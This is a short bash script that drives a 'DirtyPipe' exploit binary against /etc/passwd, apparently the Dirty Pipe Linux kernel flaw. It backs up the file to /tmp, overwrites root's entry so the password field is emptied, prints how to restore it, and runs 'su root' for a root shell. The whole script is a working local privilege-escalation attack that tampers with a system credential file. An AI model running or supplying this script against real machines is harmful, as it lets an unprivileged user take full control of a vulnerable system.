#/bin/bash

rm -f /tmp/passwd
cp /etc/passwd /tmp/passwd
if [ -f "/tmp/passwd" ];then
	passwd_tmp=$(cat /etc/passwd|head)
	./DirtyPipe /etc/passwd 1 "${passwd_tmp/root:x/oot:}"

	echo -e "\n# To recover the passwd:\n\trm -rf /etc/passwd\n\tmv /tmp/passwd /etc/passwd"

	su root
else
	echo "# Can't backup '/etc/passwd' to '/tmp/passwd'"
	exit 1
fi

